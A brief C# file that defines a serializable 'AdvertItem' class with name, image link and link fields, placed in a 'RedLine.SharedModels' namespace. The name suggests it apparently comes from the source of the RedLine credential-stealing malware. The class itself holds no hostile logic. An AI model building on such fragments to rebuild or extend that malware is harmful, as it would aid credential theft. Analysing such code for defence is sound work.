using System.Runtime.Serialization;

namespace RedLine.SharedModels;

[DataContract(Name = "AdvertItem", Namespace = "Ad")]
public class AdvertItem
{
	[DataMember(Name = "Name")]
	public string Name { get; set; }

	[DataMember(Name = "ImageLink")]
	public string ImageLink { get; set; }

	[DataMember(Name = "Link")]
	public string Link { get; set; }
}
